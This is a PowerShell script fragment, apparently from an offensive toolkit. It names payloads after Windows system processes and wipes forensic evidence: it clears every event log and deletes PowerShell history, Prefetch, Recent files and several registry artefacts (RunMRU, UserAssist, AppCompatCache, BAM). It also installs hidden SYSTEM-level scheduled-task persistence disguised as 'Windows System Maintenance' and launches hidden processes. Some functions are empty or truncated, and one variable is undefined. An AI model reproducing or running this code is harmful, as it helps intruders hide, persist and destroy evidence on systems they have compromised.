# Random filename generation
function Get-RandomFilename {
    $systemNames = @("dllhost", "svchost", "csrss", "winlogon", "services", "lsass", "spoolsv", "taskhost", "runtime", "wmiprvse")
    $extensions = @(".exe", ".dll", ".tmp", ".dat", ".sys")
    $randomName = $systemNames | Get-Random
    $randomExt = $extensions | Get-Random
    return $randomName + $randomExt
}

function Write-StealthProgress {

}

function Invoke-DeepClean {

        @{Name="PS History"; Path=(Get-PSReadLineOption).HistorySavePath},
        @{Name="Event Logs"; Path="EventLog"},
        @{Name="Prefetch Files"; Path="$env:windir\Prefetch"},
        @{Name="Temp Files"; Path="$env:temp"},
        @{Name="Recent Files"; Path="$env:APPDATA\Microsoft\Windows\Recent"},
        @{Name="RunMRU"; Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"}
    )
    
    foreach ($op in $cleanOps) {
        try {
            if ($op.Name -eq "Event Logs") {
                wevtutil el | ForEach-Object { wevtutil cl $_ }
            } elseif ($op.Name -eq "RunMRU") {
                Remove-ItemProperty -Path $op.Path -Name "*" -ErrorAction SilentlyContinue
            } else {
                if (Test-Path $op.Path) {
                    Get-ChildItem -Path $op.Path -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                }
            }
            Write-Host "  → Cleared: $($op.Name)" -ForegroundColor Yellow
        } catch {
            Write-Host "  → Failed: $($op.Name)" -ForegroundColor DarkGray
        }
    }
    
    # Advanced registry cleaning
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
        "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
    )
    
    foreach ($regPath in $regPaths) {
        try {
            if (Test-Path $regPath) {
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
    
    # Clear recycle bin silently
    try {
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "`n[+] Deep Clean Complete" -ForegroundColor Green
}

function Set-StealthPersistence {
    param([string]$TargetPath)
    
    Write-StealthProgress -Message "Configuring stealth persistence" -Duration 3
    
    try {
        $action = New-ScheduledTaskAction -Execute $TargetPath -WorkingDirectory (Split-Path $TargetPath)
        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:05:00"
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
        
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Windows System Maintenance" -Force | Out-Null
        
        # Hide task from normal view
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($task) {
            $task | Set-ScheduledTask -Hidden | Out-Null
        }
    } catch {
        Write-Host "[!] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Remove-StealthPersistence {
    Write-Host "`n[!] Removing persistence..." -ForegroundColor Yellow
    
    foreach ($task in $TaskNames) {
        try {
            if (Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue) {
                Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
                Write-Host "  → Removed task: $task" -ForegroundColor Green
            }
        } catch {}
    }
}

function Start-StealthProcess {
    param([string]$ProcessPath)
    
    Write-StealthProgress -Message "Launching in stealth mode" -Duration 2
    
    try {
        # Start process with minimal visibility
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = $ProcessPath
        $processStartInfo.WorkingDirectory = Split-Path $ProcessPath
        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processStartInfo.CreateNoWindow = $true
        $processStartInfo.UseShellExecute = $false
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processStartInfo
        $process.Start() | Out-Null
        
        # Allow process to initialize then hide it further
        Start-Sleep -Seconds 2
        
        return $process
    } catch {
        Write-Host "[!] Process start failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}
